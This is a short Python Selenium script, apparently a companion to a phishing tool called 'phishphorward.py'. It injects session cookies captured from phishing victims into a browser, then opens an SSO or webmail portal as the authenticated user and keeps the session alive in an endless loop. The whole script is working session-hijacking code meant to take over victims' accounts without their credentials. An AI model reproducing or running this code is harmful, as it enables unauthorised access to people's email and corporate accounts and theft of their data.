import time
from selenium import webdriver

cookies = #insert cookies exactly as it was output from phishphorward.py (should be a list format i.e. [cookie: "someauthcookie", second cookie "etc"])
driver = webdriver.Chrome("C:\chromedriver.exe") #update to path of chromedriver
driver.get("https://somesite.com") #insert login page here could be SSO portal, OWA portal, etc.


for cookie in cookies:
    driver.add_cookie(cookie)

driver.get("https://authenticatedsite.com") #insert the page you expect to go to once authenticated. I.e. if you go to webmail.client.com which takes you to somesite.com SSO portal, 

while True:			                                #the above field should be SSO site this field should be webmail.client.com
    time.sleep(60)
